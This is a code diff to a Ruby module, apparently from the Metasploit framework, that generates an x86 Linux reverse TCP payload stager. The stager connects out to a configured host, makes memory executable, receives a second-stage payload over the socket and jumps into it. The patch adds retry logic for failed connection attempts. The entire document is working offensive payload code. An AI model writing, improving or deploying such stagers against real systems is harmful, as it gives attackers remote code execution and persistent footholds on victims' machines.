@@ -91,6 +91,9 @@ module Payload::Linux::ReverseTcp
     encoded_host = "0x%.8x" % Rex::Socket.addr_aton(opts[:host]||"127.127.127.127").unpack("V").first
 
     asm = %Q^
+        push #{retry_count}        ; retry counter
+        pop esi
+      create_socket:
         xor ebx, ebx
         mul ebx
         push ebx
@@ -100,14 +103,15 @@ module Payload::Linux::ReverseTcp
         mov al, 0x66
         mov ecx, esp
         int 0x80                   ; sys_socketcall (socket())
-        test eax, eax
-        js failed
-
         xchg eax, edi              ; store the socket in edi
+
+      set_address:
         pop ebx                    ; set ebx back to zero
         push #{encoded_host}
         push #{encoded_port}
         mov ecx, esp
+
+      try_connect:
         push 0x66
         pop eax
         push eax
@@ -117,12 +121,18 @@ module Payload::Linux::ReverseTcp
         inc ebx
         int 0x80                   ; sys_socketcall (connect())
         test eax, eax
-        js failed
+        jns mprotect
+
+      handle_failure:
+        dec esi
+        jnz create_socket
+        jmp failed
     ^
 
     asm << asm_send_uuid if include_send_uuid
 
     asm << %Q^
+      mprotect:
         mov dl, 0x7
         mov ecx, 0x1000
         mov ebx, esp
@@ -133,6 +143,7 @@ module Payload::Linux::ReverseTcp
         test eax, eax
         js failed
 
+      recv:
         pop ebx
         mov ecx, esp
         cdq
@@ -142,6 +153,7 @@ module Payload::Linux::ReverseTcp
         test eax, eax
         js failed
         jmp ecx
+
       failed:
         mov eax, 0x1
         mov ebx, 0x1              ; set exit status to 1
